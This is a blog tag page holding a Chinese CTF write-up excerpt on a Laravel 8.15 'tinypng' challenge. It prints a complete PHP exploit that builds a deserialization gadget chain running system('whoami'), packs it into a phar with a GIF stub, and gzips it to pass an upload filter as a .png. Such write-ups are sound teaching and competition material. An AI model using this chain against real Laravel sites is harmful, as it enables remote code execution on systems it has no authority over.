@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Laravel :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/tags/laravel/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Laravel">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/tags/laravel/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/tags/laravel/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/hufuctfweb/">2021年虎符线下赛WEB</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-05-09 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/laravel/">Laravel</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h2 id="tinypng">tinypng</h2>
+<p>题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png" alt="">
+首先查看路由信息
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png" alt=""></p>
+<p>先查看一下<code>fileupload</code>路由，可以发现文件上传时对内容进行了过滤，且只允许上传<code>png</code>
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png" alt=""></p>
+<p>接着我们看image路由，进入<code>ImageController</code>，<code>$source</code>可控接着判断是否为<code>png</code>结尾，如果为<code>png</code>结尾则传给<code>imgcompress</code>类。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png" alt="">
+进入<code>imgcompress</code>类，<code>$this-&gt;src</code>为我们传入的<code>$source</code>
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png" alt="">
+接着又传递给<code>compressImg</code>类，调用了<code>openImg</code>方法
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png" alt=""></p>
+<p>将<code>$source</code>传递给了<code>getimagesize</code>，<code>getimagesize</code>可以触发<code>phar</code>反序列化
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png" alt=""></p>
+<p>现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。
+从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。</p>
+<pre tabindex="0"><code class="language-<?php" data-lang="<?php">namespace Illuminate\Broadcasting {
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($events, $event) {
+            $this-&gt;events = $events;
+            $this-&gt;event = $event;
+        }
+    }
+
+    class BroadcastEvent {
+        public $connection;
+        public function __construct($connection) {
+            $this-&gt;connection = $connection;
+        }
+    }
+}
+
+namespace Illuminate\Bus {
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct($queueResolver){
+            $this-&gt;queueResolver = $queueResolver;
+        }
+    }
+}
+
+
+namespace {
+    $c = new Illuminate\Broadcasting\BroadcastEvent(&#39;whoami&#39;);
+    $b = new Illuminate\Bus\Dispatcher(&#39;system&#39;);
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
+    #print(urlencode(serialize($a)));
+    @unlink(&#34;phar.phar&#34;);
+    $phar=new Phar(&#34;phar.phar&#34;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&#39;GIF89a&#39;.&#34;__HALT_COMPILER();&#34;);
+    $phar-&gt;setMetadata($a);
+    $phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;);
+    $phar-&gt;stopBuffering();
+}
+ 
+</code></pre><p>通过如上exp生成<code>phar</code>文件，使用<code>gzip</code>打包修改为png后缀
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png" alt=""></p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/hufuctfweb/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
